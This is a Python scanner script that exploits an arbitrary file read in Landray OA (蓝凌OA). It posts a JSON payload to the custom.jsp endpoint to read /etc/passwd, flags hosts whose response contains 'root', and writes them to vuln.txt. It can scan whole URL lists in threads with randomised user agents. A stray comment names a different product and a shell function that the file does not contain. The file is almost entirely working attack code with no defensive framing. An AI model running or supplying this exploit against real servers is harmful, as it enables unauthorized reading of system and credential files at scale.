import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
import re

#app="金蝶云星空-管理中心"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua


proxies={'http': 'http://127.0.0.1:8080',
		'https': 'https://127.0.0.1:8080'}



def wirte_targets(vurl, filename):
	with open(filename, "a+") as f:
		f.write(vurl + "\n")

#poc
def check_vuln(url):

	#清洗url
	url = parse.urlparse(url)
	url2 = url1 = url.scheme + '://' + url.netloc
	url1 = url.scheme + '://' + url.netloc + '/sys/ui/extend/varkind/custom.jsp'
	data ='''var={"body":{"file":"file:///etc/passwd"}}'''
	try:
		headers = {'User-Agent': get_ua(),
		"Content-Type":"application/x-www-form-urlencoded"
		}
		res = requests.post(url1,headers=headers,data=data,timeout=30,verify=False,proxies=proxies)
		#跨行从开头匹配到response_error之间的内容
		# rsp_command=re.findall(r'(.*?)response_error', res.text, re.DOTALL)[0]
		#len(rsp_command)防止执行无结果的情况
		if res.status_code == 200 and "root" in res.text:
			# data=res.text.replace('\r\n','')
			print("\033[32m[+]{} is vulnerable. \033[0m".format(url2))
			wirte_targets(url2,"vuln.txt")
			#为cmdshell函数做准备
			return 1
		else:
			print("\033[31m[-]{} is no vulnerable\033[0m".format(url2))
	except Exception as e:
		print ("[!]{} is timeout。\033[0m".format(url2))


#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':

	print("\n蓝凌OA fileread scan by when\n")

	arg=ArgumentParser(description='check_url By when')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:python3 Landray-OA_fileread.py -u http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="url_list; Example:python3 Landray-OA_fileread.py -f url.txt")

	args=arg.parse_args()
	url=args.url
	filename=args.file
	if url != None and filename == None:
		check_vuln(url)
	elif url == None and filename != None:
		start=time()
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
		end=time()
		print('任务完成，用时{}'.format(end-start))


